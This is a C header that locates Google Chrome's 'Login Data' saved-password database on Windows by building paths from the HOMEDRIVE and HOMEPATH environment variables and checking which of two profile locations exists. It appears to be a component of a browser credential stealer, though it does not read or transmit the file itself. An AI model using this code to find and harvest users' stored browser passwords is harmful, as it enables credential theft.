#ifndef FILE_FINDER_H_INCLUDED
#define FILE_FINDER_H_INCLUDED

string first_path(void);
string second_path(void);
bool found_data(string path);
int find_chrome(void);
string find_home_path(void);
string find_drive(void);

string second_path(void)
{
    string drive, path, path2;
    int search_result;

    drive = find_drive();
    path = find_home_path();
    return Concat(drive,Concat(path, "/Local Settings/Application Data/Google/Chrome/User Data/Default/Login Data"));

}

string first_path(void)
{
    string drive, path, path2;
    int search_result;

    drive = find_drive();
    path = find_home_path();
    return Concat(drive,Concat(path, "/AppData/Local/Google/Chrome/User Data/Default/Login Data"));

}

int find_chrome(void)
{
    if(found_data(first_path()))
        return 1;
    if(found_data(second_path()))
        return 2;
    return 0;
}

bool found_data(string path)
{
    FILE *exist;
    exist = fopen(path, "r");
    if(exist == NULL)
        return FALSE;
    return TRUE;
}
string find_drive(void)
{
    return Concat(getenv("HOMEDRIVE"), "/");
}

string find_home_path(void)
{
    string path, path2;
    int search_result;

    path = getenv("HOMEPATH");
    search_result = FindChar('\\', path, 1);
    path2 = SubString(path, search_result + 1, StringLength(path) - 1);
    path = SubString(path, 1, search_result - 1);
    return Concat(path,Concat("/", path2));
}



#endif // FILE_FINDER_H_INCLUDED
